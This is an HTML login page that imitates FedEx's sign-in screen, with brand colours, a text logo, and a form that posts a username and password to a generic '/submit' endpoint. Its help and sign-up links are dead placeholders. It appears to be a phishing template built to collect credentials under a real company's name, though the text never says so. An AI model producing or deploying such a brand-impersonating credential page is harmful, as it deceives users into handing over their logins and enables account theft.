<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>FedEx | Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-color: #f5f5f5;
            font-family: "Segoe UI", Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 400px;
            margin: 80px auto;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.15);
            padding: 40px 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            font-size: 28px;
            font-weight: bold;
            color: #4d148c;
        }
        .logo h1 span {
            color: #ff6600;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-weight: 600;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #cfcfcf;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 15px;
        }
        .button {
            background-color: #4d148c;
            color: white;
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
        }
        .button:hover {
            background-color: #350c64;
        }
        .link {
            text-align: center;
            margin-top: 10px;
        }
        .link a {
            color: #4d148c;
            font-size: 13px;
            text-decoration: none;
        }
        .link a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            font-size: 11px;
            color: #888;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Fed<span>Ex</span></h1>
        </div>
        <h2>Sign In</h2>
        <form action="/submit" method="POST">
            <label for="userid">Username</label>
            <input type="text" id="userid" name="userid" placeholder="Enter your username" required>

            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Enter your password" required>

            <button type="submit" class="button">Log In</button>
        </form>

        <div class="link">
            <a href="#">Forgot username or password?</a>
        </div>
        <div class="link" style="margin-top: 5px;">
            <a href="#">Sign Up</a> | <a href="#">Need Help?</a>
        </div>

        <div class="footer">
            Â© FedEx 2025 | Privacy Policy | Terms of Use
        </div>
    </div>
</body>
</html>
